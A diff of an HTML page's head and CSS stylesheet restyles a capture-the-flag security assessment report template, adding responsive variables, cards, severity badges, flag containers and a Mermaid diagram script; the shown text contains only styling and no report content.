@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Revolution Elite - Penetration Test Report</title>
+    <title>Revolution Elite CTF - Security Assessment Report</title>
     
     <!-- Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap" rel="stylesheet">
@@ -11,39 +11,56 @@
     
     <!-- Icon Library -->
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    
+    <!-- Mermaid for diagrams -->
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@10.6.1/dist/mermaid.min.js"></script>
 
     <style>
-        /* ===== ROOT VARIABLES - DARK MODE WITH RED HAT BRANDING ===== */
-        :root {
-            --primary: #ee5a52;
-            --primary-dark: #cc4844;
-            --primary-light: #ff7070;
-            --bg-dark: #0f0f0f;
-            --bg-card: #1a1a1a;
-            --bg-hover: #252525;
-            --text-light: #ffffff;
-            --text-muted: #bbbbbb;
-            --border: #333333;
-            --success: #2ecc71;
-            --warning: #f39c12;
-            --info: #3498db;
-            --danger: #e74c3c;
-            
-            --font-main: 'Inter', sans-serif;
-            --font-code: 'JetBrains Mono', monospace;
-            
-            --shadow: 0 4px 12px rgba(0, 0, 0, 0.6);
-            --shadow-lg: 0 12px 24px rgba(0, 0, 0, 0.7);
-        }
-
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
+        :root {
+            --primary: #ee5a52;
+            --primary-light: #ff7070;
+            --accent: #3498db;
+            --bg-dark: #0f0f0f;
+            --bg-darker: #0a0a0a;
+            --bg-card: #1a1a1a;
+            --text-light: #f1f5f9;
+            --text-muted: #94a3b8;
+            --border: rgba(238, 90, 82, 0.2);
+            --success: #10b981;
+            --warning: #f59e0b;
+            
+            --gap-xs: clamp(0.25rem, 2vw, 0.5rem);
+            --gap-sm: clamp(0.5rem, 3vw, 1rem);
+            --gap-md: clamp(0.75rem, 4vw, 1.5rem);
+            --gap-lg: clamp(1rem, 5vw, 2rem);
+            --gap-xl: clamp(1.25rem, 6vw, 2.5rem);
+            
+            --font-xs: clamp(0.7rem, 2.5vw, 0.875rem);
+            --font-sm: clamp(0.8rem, 3vw, 1rem);
+            --font-base: clamp(0.9rem, 3.5vw, 1.125rem);
+            --font-lg: clamp(1rem, 4vw, 1.25rem);
+            --font-xl: clamp(1.1rem, 5vw, 1.5rem);
+            --font-2xl: clamp(1.3rem, 6vw, 2rem);
+            --font-3xl: clamp(1.8rem, 8vw, 3rem);
+            
+            --font-main: 'Inter', sans-serif;
+            --font-code: 'JetBrains Mono', monospace;
+            
+            --shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+            --shadow-lg: 0 8px 25px rgba(0, 0, 0, 0.5);
+            --blur: 15px;
+            --radius: clamp(0.5rem, 2vw, 1rem);
+        }
+
         html {
             scroll-behavior: smooth;
+            font-size: 16px;
         }
 
         body {
@@ -51,234 +68,954 @@
             background: var(--bg-dark);
             color: var(--text-light);
             line-height: 1.6;
-            font-size: 16px;
+            font-size: var(--font-base);
             min-height: 100vh;
             overflow-x: hidden;
+            position: relative;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
         }
 
         body::before {
             content: '';
             position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
+            top: 0; left: 0; right: 0; bottom: 0;
             background: 
                 radial-gradient(circle at 20% 50%, rgba(238, 90, 82, 0.03) 0%, transparent 50%),
-                radial-gradient(circle at 80% 20%, rgba(52, 152, 219, 0.02) 0%, transparent 50%);
+                radial-gradient(circle at 80% 20%, rgba(49, 130, 206, 0.02) 0%, transparent 50%);
             pointer-events: none;
             z-index: -1;
         }
 
-        /* ===== HEADER & NAVIGATION ===== */
-        .navbar {
-            background: linear-gradient(135deg, #1a1a1a 0%, #0f0f0f 100%);
-            border-bottom: 3px solid var(--primary);
-            padding: 1.5rem 0;
+        .main-wrapper {
+            width: 100%;
+            max-width: 100vw;
+            margin: 0 auto;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        .container {
+            width: 100%;
+            max-width: min(1200px, 95vw);
+            margin: 0 auto;
+            padding: 0 var(--gap-sm);
+            box-sizing: border-box;
+        }
+
+        .banner {
+            background: linear-gradient(90deg, var(--primary), var(--primary-light), var(--accent));
+            color: white;
+            text-align: center;
+            padding: var(--gap-sm);
+            font-weight: 700;
+            letter-spacing: 1px;
+            font-size: var(--font-xs);
             position: sticky;
             top: 0;
             z-index: 1000;
             box-shadow: var(--shadow);
+            word-break: break-word;
         }
 
-        .navbar-container {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 0 2rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+        .banner-bottom {
+            background: linear-gradient(90deg, var(--primary), var(--primary-light), var(--accent));
+            color: white;
+            text-align: center;
+            padding: var(--gap-sm);
+            font-weight: 700;
+            letter-spacing: 1px;
+            font-size: var(--font-xs);
+            box-shadow: 0 -4px 10px rgba(0, 0, 0, 0.3);
+            word-break: break-word;
         }
 
-        .navbar-logo {
-            font-size: 1.75rem;
-            font-weight: 900;
-            color: var(--text-light);
-            display: flex;
-            align-items: center;
-            gap: 0.75rem;
-        }
-
-        .navbar-logo span {
-            color: var(--primary);
-        }
-
-        .navbar-nav {
-            display: flex;
-            gap: 2rem;
-            list-style: none;
-        }
-
-        .navbar-nav a {
-            color: var(--text-muted);
-            text-decoration: none;
-            font-weight: 600;
-            text-transform: uppercase;
-            font-size: 0.875rem;
-            letter-spacing: 0.05em;
-            transition: all 0.3s ease;
+        .header {
+            background: linear-gradient(135deg, var(--bg-card) 0%, var(--bg-dark) 100%);
+            padding: 1.5rem 0;
+            border-bottom: 1px solid var(--border);
             position: relative;
-        }
-
-        .navbar-nav a:hover {
-            color: var(--primary);
-        }
-
-        .navbar-nav a::after {
-            content: '';
-            position: absolute;
-            bottom: -0.5rem;
-            left: 0;
-            width: 0;
-            height: 2px;
-            background: var(--primary);
-            transition: width 0.3s ease;
-        }
-
-        .navbar-nav a:hover::after {
+            overflow: hidden;
             width: 100%;
         }
 
-        /* ===== MAIN CONTAINER ===== */
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 2rem;
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary), var(--primary-light), var(--accent));
         }
 
-        /* ===== HERO SECTION ===== */
-        .hero {
+        .header-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 1rem;
             text-align: center;
-            padding: 4rem 0;
-            border-bottom: 3px solid var(--primary);
-            margin-bottom: 4rem;
+            width: 100%;
+            max-width: 100%;
+            overflow: hidden;
         }
 
-        .hero h1 {
-            font-size: 3.5rem;
+        .profile-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: var(--gap-md);
+            flex-shrink: 0;
+        }
+
+        .profile-img-container {
+            width: min(80px, 18vw);
+            height: min(80px, 18vw);
+            border-radius: 50%;
+            overflow: hidden;
+            border: 3px solid var(--primary);
+            box-shadow: 
+                0 0 30px rgba(238, 90, 82, 0.4),
+                0 0 60px rgba(238, 90, 82, 0.2);
+            background: linear-gradient(135deg, rgba(238, 90, 82, 0.1), rgba(49, 130, 206, 0.05));
+            position: relative;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .profile-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 50%;
+            filter: brightness(1.1) contrast(1.2);
+        }
+
+        .main-info {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: var(--gap-sm);
+            width: 100%;
+            max-width: 100%;
+            text-align: center;
+            overflow: hidden;
+        }
+
+        .brand-title {
+            font-size: var(--font-3xl);
             font-weight: 900;
-            margin-bottom: 1rem;
-            color: var(--text-light);
+            background: linear-gradient(135deg, var(--primary), var(--primary-light), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -1px;
+            line-height: 1.1;
+            text-transform: uppercase;
+            margin: 0;
+            width: 100%;
+            max-width: 100%;
+            word-break: break-word;
+            overflow-wrap: break-word;
+            hyphens: auto;
         }
 
-        .hero h1 span {
-            color: var(--primary);
-        }
-
-        .hero p {
-            font-size: 1.25rem;
+        .subtitle {
+            font-size: var(--font-base);
             color: var(--text-muted);
-            margin-bottom: 2rem;
-            max-width: 800px;
+            max-width: min(600px, 90vw);
+            margin: 0 auto;
+            line-height: 1.8;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+            hyphens: auto;
+            text-align: center;
+            letter-spacing: 0.003em;
+        }
+
+        .badge {
+            display: inline-block;
+            background: linear-gradient(135deg, rgba(238, 90, 82, 0.2), rgba(255, 112, 112, 0.15));
+            color: var(--primary);
+            border: 1px solid rgba(238, 90, 82, 0.4);
+            border-radius: 2rem;
+            padding: var(--gap-xs) var(--gap-md);
+            font-size: var(--font-sm);
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin: var(--gap-xs) 0;
+            word-break: keep-all;
+            flex-shrink: 0;
+        }
+
+        .contact-section {
+            width: 100%;
+            max-width: 100%;
+            display: flex;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .contact-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 0.5rem;
+            width: 100%;
+            max-width: min(600px, 95vw);
+            margin: 0 auto;
+        }
+
+        .contact-item {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: var(--gap-xs);
+            color: var(--text-muted);
+            font-size: var(--font-sm);
+            padding: var(--gap-xs);
+            border-radius: var(--radius);
+            transition: all 0.3s ease;
+            word-break: break-word;
+            overflow-wrap: break-word;
+            text-align: center;
+            min-width: 0;
+            max-width: 100%;
+        }
+
+        .contact-item:hover {
+            color: var(--text-light);
+            background: rgba(238, 90, 82, 0.1);
+        }
+
+        .contact-icon {
+            color: var(--primary);
+            font-size: var(--font-lg);
+            min-width: 20px;
+            flex-shrink: 0;
+        }
+
+        .contact-item a {
+            color: inherit;
+            text-decoration: none;
+            word-break: break-all;
+            overflow-wrap: break-word;
+            min-width: 0;
+        }
+
+        .main-content {
+            padding: var(--gap-lg) 0;
+            width: 100%;
+            overflow-x: hidden;
+        }
+
+        .content-section {
+            margin-bottom: var(--gap-xl);
+            width: 100%;
+            overflow-x: hidden;
+        }
+
+        .section-card {
+            background: linear-gradient(135deg, rgba(26, 26, 26, 0.9), rgba(15, 15, 15, 0.8));
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            overflow: hidden;
+            box-shadow: var(--shadow-lg);
+            position: relative;
+            transition: transform 0.3s ease;
+            margin-bottom: var(--gap-lg);
+            width: 100%;
+        }
+
+        .section-card:hover {
+            transform: translateY(-2px);
+        }
+
+        .section-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--primary-light), var(--accent));
+        }
+
+        .card-header {
+            padding: var(--gap-md) var(--gap-lg);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: var(--gap-sm);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .card-title {
+            background: linear-gradient(135deg, var(--primary), var(--primary-light));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: 800;
+            font-size: var(--font-xl);
+            margin: 0;
+            display: flex;
+            align-items: center;
+            gap: var(--gap-sm);
+            word-break: break-word;
+            overflow-wrap: break-word;
+            flex: 1;
+            min-width: 0;
+        }
+
+        .card-icon {
+            color: var(--primary);
+            font-size: var(--font-xl);
+            flex-shrink: 0;
+        }
+
+        .card-body {
+            padding: var(--gap-lg);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+            overflow-x: auto;
+        }
+
+        .info-box {
+            border-radius: var(--radius);
+            padding: var(--gap-md);
+            margin: var(--gap-md) 0;
+            position: relative;
+            backdrop-filter: blur(var(--blur));
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .info-box::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 3px;
+            border-radius: var(--radius) var(--radius) 0 0;
+        }
+
+        .info-box.info {
+            background: linear-gradient(135deg, rgba(49, 130, 206, 0.15), rgba(59, 130, 246, 0.1));
+            border: 1px solid rgba(49, 130, 206, 0.4);
+        }
+        .info-box.info::before { background: linear-gradient(90deg, var(--accent), #3b82f6); }
+
+        .info-box.success {
+            background: linear-gradient(135deg, rgba(16, 185, 129, 0.15), rgba(5, 150, 105, 0.1));
+            border: 1px solid rgba(16, 185, 129, 0.4);
+        }
+        .info-box.success::before { background: linear-gradient(90deg, var(--success), #059669); }
+
+        .info-box.warning {
+            background: linear-gradient(135deg, rgba(245, 158, 11, 0.15), rgba(217, 119, 6, 0.1));
+            border: 1px solid rgba(245, 158, 11, 0.4);
+        }
+        .info-box.warning::before { background: linear-gradient(90deg, var(--warning), #d97706); }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(clamp(140px, 25vw, 180px), 1fr));
+            gap: var(--gap-md);
+            margin: var(--gap-lg) 0;
+        }
+
+        .stat-card {
+            background: linear-gradient(135deg, rgba(15, 15, 15, 0.9), rgba(26, 26, 26, 0.8));
+            padding: var(--gap-md);
+            border-radius: var(--radius);
+            text-align: center;
+            border: 1px solid var(--border);
+            position: relative;
+            transition: all 0.3s ease;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-2px);
+        }
+
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--primary-light));
+        }
+
+        .stat-number {
+            font-size: var(--font-2xl);
+            font-weight: 900;
+            background: linear-gradient(135deg, var(--primary), var(--primary-light));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: var(--gap-xs);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 60px;
+        }
+
+        .stat-label {
+            font-size: var(--font-xs);
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 600;
+            word-break: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: var(--gap-md) 0;
+            border-radius: var(--radius);
+            overflow: hidden;
+            box-shadow: var(--shadow);
+            font-size: var(--font-sm);
+            table-layout: fixed;
+        }
+
+        .data-table th {
+            background: linear-gradient(135deg, var(--bg-darker), var(--bg-card));
+            padding: var(--gap-sm);
+            font-weight: 700;
+            text-align: left;
+            color: var(--text-light);
+            border-bottom: 1px solid var(--border);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .data-table td {
+            padding: var(--gap-sm);
+            border-bottom: 1px solid rgba(148, 163, 184, 0.1);
+            vertical-align: top;
+            background: rgba(26, 26, 26, 0.7);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .data-table tr:last-child td {
+            border-bottom: none;
+        }
+
+        .data-table tr:hover td {
+            background: rgba(238, 90, 82, 0.05);
+        }
+
+        .code-block {
+            background: linear-gradient(135deg, var(--bg-darker), var(--bg-dark));
+            border-radius: var(--radius);
+            padding: var(--gap-md);
+            margin: var(--gap-md) 0;
+            overflow-x: auto;
+            font-family: var(--font-code);
+            font-size: var(--font-xs);
+            border: 1px solid var(--border);
+            position: relative;
+            line-height: 1.4;
+            word-break: break-all;
+            overflow-wrap: break-word;
+            color: #00ff00;
+        }
+
+        .code-block::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--primary), var(--success));
+        }
+
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            border-radius: 999px;
+            padding: 0.25rem 0.75rem;
+            font-size: var(--font-xs);
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            word-break: keep-all;
+            flex-shrink: 0;
+        }
+
+        .status-badge.critical {
+            background: linear-gradient(135deg, rgba(238, 90, 82, 0.25), rgba(255, 112, 112, 0.15));
+            color: var(--primary);
+            border: 1px solid rgba(238, 90, 82, 0.5);
+        }
+
+        .status-badge.high {
+            background: linear-gradient(135deg, rgba(239, 68, 68, 0.25), rgba(248, 113, 113, 0.15));
+            color: #ef4444;
+            border: 1px solid rgba(239, 68, 68, 0.5);
+        }
+
+        .status-badge.medium {
+            background: linear-gradient(135deg, rgba(245, 158, 11, 0.25), rgba(251, 191, 36, 0.15));
+            color: var(--warning);
+            border: 1px solid rgba(245, 158, 11, 0.5);
+        }
+
+        .highlight {
+            background: linear-gradient(135deg, rgba(15, 15, 15, 0.9), rgba(26, 26, 26, 0.8));
+            border-left: 4px solid var(--primary);
+            padding: var(--gap-md);
+            margin: var(--gap-md) 0;
+            border-radius: var(--radius);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .diagram-container {
+            background: linear-gradient(135deg, rgba(10, 10, 10, 0.95), rgba(15, 15, 15, 0.9));
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: var(--gap-md);
+            margin: var(--gap-lg) 0;
+            text-align: center;
+            overflow: hidden;
+            width: 100%;
+        }
+
+        .diagram-title {
+            margin-bottom: var(--gap-md);
+            font-size: var(--font-lg);
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--primary), var(--primary-light));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .mermaid {
+            width: 100% !important;
+            height: auto !important;
+            min-height: min(350px, 50vh) !important;
+            font-size: clamp(8px, 2vw, 12px) !important;
+            overflow: visible !important;
+        }
+
+        .timeline {
+            position: relative;
+            padding-left: var(--gap-lg);
+        }
+
+        .timeline::before {
+            content: '';
+            position: absolute;
+            left: var(--gap-sm);
+            top: 0;
+            bottom: 0;
+            width: 4px;
+            background: linear-gradient(180deg, var(--primary), var(--primary-light), var(--accent));
+        }
+
+        .timeline-item {
+            position: relative;
+            margin-left: var(--gap-lg);
+            margin-bottom: var(--gap-lg);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            left: calc(-1 * var(--gap-lg) - var(--gap-md));
+            top: var(--gap-sm);
+            width: 1rem;
+            height: 1rem;
+            background: linear-gradient(135deg, var(--primary), var(--primary-light));
+            border-radius: 50%;
+            border: 3px solid var(--bg-dark);
+            box-shadow: 0 0 10px rgba(238, 90, 82, 0.5);
+        }
+
+        .ctf-flag-container {
+            text-align: center;
+            padding: var(--gap-lg);
+            background: linear-gradient(135deg, rgba(16, 185, 129, 0.2), rgba(5, 150, 105, 0.1));
+            border-radius: var(--radius);
+            border: 2px solid var(--success);
+            margin: var(--gap-md) 0;
+            position: relative;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .ctf-flag-container::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--success), #059669);
+            border-radius: var(--radius) var(--radius) 0 0;
+        }
+
+        .ctf-flag-title {
+            font-size: var(--font-lg);
+            font-weight: 700;
+            color: var(--success);
+            margin-bottom: var(--gap-sm);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: var(--gap-xs);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .ctf-flag-content {
+            font-family: var(--font-code);
+            font-size: clamp(0.9rem, 4vw, 1.8rem);
+            font-weight: 900;
+            color: var(--success);
+            margin-bottom: var(--gap-xs);
+            word-break: break-all;
+            overflow-wrap: break-word;
+            line-height: 1.2;
+            padding: var(--gap-sm) 0;
+        }
+
+        .ctf-flag-subtitle {
+            font-size: var(--font-sm);
+            color: var(--success);
+            opacity: 0.8;
+            font-style: italic;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .footer {
+            background: linear-gradient(135deg, rgba(10, 10, 10, 0.95), rgba(15, 15, 15, 0.9));
+            padding: var(--gap-xl) 0;
+            border-top: 1px solid var(--border);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .footer-highlight {
+            background: linear-gradient(90deg, var(--primary), var(--primary-light), var(--accent));
+            color: white;
+            padding: var(--gap-xs) var(--gap-md);
+            border-radius: var(--radius);
+            display: inline-block;
+            margin-bottom: var(--gap-lg);
+            font-weight: 700;
+            font-size: var(--font-sm);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 3rem;
+            margin-bottom: var(--gap-lg);
+            max-width: 1200px;
             margin-left: auto;
             margin-right: auto;
+            padding: 0 2rem;
         }
 
-        /* ===== HEADINGS ===== */
+        .footer-section {
+            background: rgba(238, 90, 82, 0.05);
+            padding: 1.5rem;
+            border-left: 4px solid var(--primary);
+            border-radius: 0.5rem;
+        }
+
+        .footer-section h4 {
+            color: var(--text-light);
+            font-weight: 700;
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: var(--gap-xs);
+            font-size: var(--font-base);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .footer-section p {
+            margin-bottom: 1rem;
+            font-size: var(--font-sm);
+            color: var(--text-muted);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+            padding: 0.75rem 0;
+            border-bottom: 1px solid rgba(238, 90, 82, 0.15);
+            line-height: 1.6;
+        }
+
+        .footer-section p:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+        }
+
+        .footer-section p strong {
+            color: var(--text-light);
+            font-weight: 700;
+            display: inline;
+            margin-right: 0.5rem;
+        }
+
+        .footer-section a {
+            color: var(--primary);
+            text-decoration: none;
+            transition: color 0.3s ease;
+            font-weight: 600;
+        }
+
+        .footer-section a:hover {
+            color: var(--primary-light);
+            text-decoration: underline;
+        }
+
+        .footer-bottom {
+            border-top: 2px solid rgba(238, 90, 82, 0.3);
+            padding-top: 2rem;
+            margin-top: 2rem;
+            font-size: var(--font-xs);
+            text-align: center;
+            color: var(--text-muted);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .footer-bottom p {
+            margin: 0.5rem 0;
+            line-height: 1.6;
+        }
+
+        .footer-bottom p:first-child {
+            font-weight: 700;
+            color: var(--text-light);
+            font-size: 0.9rem;
+        }
+
+        .watermark {
+            position: fixed;
+            bottom: var(--gap-md);
+            right: var(--gap-md);
+            width: clamp(40px, 6vw, 60px);
+            height: clamp(40px, 6vw, 60px);
+            opacity: 0.1;
+            pointer-events: none;
+            z-index: 50;
+            filter: grayscale(80%) contrast(120%);
+            border-radius: var(--radius);
+        }
+
+        .text-center { text-align: center; }
+        .text-justify { text-align: justify; }
+        .font-bold { font-weight: 700; }
+        .mb-3 { margin-bottom: 0.75rem; }
+        .mb-4 { margin-bottom: 1rem; }
+        .mr-2 { margin-right: 0.5rem; }
+        .ml-2 { margin-left: 0.5rem; }
+        .text-xl { font-size: var(--font-xl); }
+        .text-2xl { font-size: var(--font-2xl); }
+        .text-lg { font-size: var(--font-lg); }
+        .text-blue { color: var(--accent); }
+        .text-green { color: var(--success); }
+        .text-red { color: var(--primary); }
+        .text-yellow { color: var(--warning); }
+        .text-muted { color: var(--text-muted); }
+
+        .list-disc { list-style-type: disc; }
+        .pl-6 { padding-left: 1.5rem; }
+        .space-y-1 > * + * { margin-top: 0.25rem; }
+
+        @media (min-width: 480px) {
+            .contact-grid {
+                grid-template-columns: 1fr;
+            }
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (min-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                justify-content: center;
+                text-align: center;
+                align-items: center;
+            }
+            .main-info {
+                text-align: center;
+                flex: 1;
+                max-width: none;
+            }
+            .stats-grid {
+                grid-template-columns: repeat(4, 1fr);
+            }
+            .footer-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (max-width: 480px) {
+            .footer-grid {
+                grid-template-columns: 1fr;
+                gap: 1.5rem;
+            }
+            .profile-img-container {
+                width: min(70px, 15vw);
+                height: min(70px, 15vw);
+            }
+        }
+
+        @media print {
+            * {
+                -webkit-print-color-adjust: exact !important;
+                color-adjust: exact !important;
+            }
+            body {
+                background: var(--bg-dark) !important;
+                font-size: 12pt !important;
+            }
+            .watermark {
+                display: none !important;
+            }
+        }
+
+        .header-box h1 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: #ffffff;
+            margin: 0.5rem 0;
+        }
+
+        .header-box h1 span {
+            color: #ee5a52;
+        }
+
+        .header-box p {
+            color: #bbbbbb;
+            font-size: 1.1rem;
+            margin: 0.5rem 0;
+        }
+
+        /* ===== HEADINGS - ENTERPRISE GRADE ===== */
         h1, h2, h3 { 
             color: var(--primary);
             page-break-after: avoid;
-            font-weight: 700;
+            font-weight: 800;
             margin-top: 1.5rem;
-            margin-bottom: 0.5rem;
+            margin-bottom: 0.75rem;
+            line-height: 1.25;
+            letter-spacing: -0.02em;
+        }
+
+        h1 {
+            font-size: clamp(2rem, 5vw, 3rem);
+            font-weight: 900;
+            letter-spacing: -0.03em;
+        }
+
+        h2 {
+            font-size: clamp(1.5rem, 3vw, 2.25rem);
+            font-weight: 800;
+        }
+
+        h3 {
+            font-size: clamp(1.125rem, 2vw, 1.5rem);
+            font-weight: 700;
         } 
 
-        /* ===== CARDS & CONTAINERS ===== */
-        .card {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 0;
-            border-top: 4px solid var(--primary);
-            padding: 2rem;
-            margin-bottom: 2rem;
-            box-shadow: var(--shadow);
-            transition: all 0.3s ease;
-        }
-
-        .card:hover {
-            box-shadow: var(--shadow-lg);
-            transform: translateY(-4px);
-        }
-
         /* ===== FINDINGS SECTION ===== */
-        .finding {
-            background: var(--bg-card);
-            border-left: 5px solid var(--primary);
-            border-radius: 0;
-            padding: 2rem;
-            margin-bottom: 1.5rem;
-            box-shadow: var(--shadow);
+        .finding { 
+            margin: 1.5rem 0;
+            padding: 1.5rem;
+            border-left: 5px solid #ee5a52;
+            background: linear-gradient(135deg, #1a0a2e 0%, #0f0a1a 100%);
             page-break-inside: avoid;
-        }
-
-        .finding.critical {
-            border-left-color: #e74c3c;
-            background: linear-gradient(135deg, rgba(231, 76, 60, 0.1) 0%, transparent 100%);
-        }
-
-        .finding.high {
-            border-left-color: #e67e22;
-            background: linear-gradient(135deg, rgba(230, 126, 34, 0.1) 0%, transparent 100%);
-        }
-
-        .finding.medium {
-            border-left-color: #f39c12;
-            background: linear-gradient(135deg, rgba(243, 156, 18, 0.1) 0%, transparent 100%);
+            border-radius: 4px;
+            box-shadow: 0 4px 15px rgba(238, 90, 82, 0.15);
+            border-top: 1px solid rgba(238, 90, 82, 0.3);
+            border-right: 1px solid rgba(238, 90, 82, 0.3);
+            border-bottom: 1px solid rgba(238, 90, 82, 0.3);
         }
 
         .finding h3 {
             color: #00ff00;
             font-weight: 700;
             text-shadow: 0 0 10px rgba(0, 255, 0, 0.6);
-            border-bottom: 2px solid var(--primary);
+            border-bottom: 2px solid #ee5a52;
             padding-bottom: 0.5rem;
             margin-bottom: 1rem;
         }
 
-        /* ===== BADGES ===== */
+        /* ===== SEVERITY BADGES ===== */
         .badge {
             display: inline-block;
-            padding: 0.5rem 1rem;
-            border-radius: 0;
+            padding: 0.4rem 0.8rem;
+            border-radius: 4px;
             font-size: 0.75rem;
             font-weight: 700;
             text-transform: uppercase;
-            letter-spacing: 0.05em;
+            letter-spacing: 1px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            margin-left: 0.5rem;
         }
 
-        .badge-critical {
-            background: linear-gradient(135deg, #8B0000 0%, #DC143C 100%);
-            color: white;
+        .badge-critical { 
+            background: linear-gradient(135deg, #8B0000, #DC143C);
+            color: #fff;
             box-shadow: 0 0 10px rgba(220, 20, 60, 0.6);
         }
-
-        .badge-high {
-            background: linear-gradient(135deg, #C62828 0%, #e53935 100%);
-            color: white;
+        .badge-high { 
+            background: linear-gradient(135deg, #C62828, #e53935);
+            color: #fff;
             box-shadow: 0 0 10px rgba(229, 57, 53, 0.5);
         }
-
-        .badge-medium {
-            background: linear-gradient(135deg, #F57C00 0%, #FF8F00 100%);
-            color: white;
-            box-shadow: 0 0 10px rgba(255, 143, 0, 0.5);
+        .badge-medium { 
+            background: linear-gradient(135deg, #FFB300, #FF8F00);
+            color: #1D2B36;
+            box-shadow: 0 0 10px rgba(255, 179, 0, 0.5);
         }
+        .badge-low {
+            background: linear-gradient(135deg, #4CAF50, #388E3C);
+            color: white;
+            box-shadow: 0 0 10px rgba(76, 175, 80, 0.5);
+        }
+
+        .finding.sev-critical { border-left-color: #DC143C; }
+        .finding.sev-high { border-left-color: #e53935; }
+        .finding.sev-medium { border-left-color: #FFB300; }
+        .finding.sev-low { border-left-color: #4CAF50; }
 
         /* ===== TABLES ===== */
         table {
             width: 100%;
-            border: 2px solid var(--primary);
+            border: 2px solid #ee5a52;
             border-collapse: collapse;
             page-break-inside: avoid;
-            box-shadow: 0 0 15px rgba(238, 90, 82, 0.2);
+            box-shadow: 0 0 15px rgba(238, 90, 82, 0.15);
             margin: 1rem 0;
         }
         
         table td {
             padding: 0.8rem;
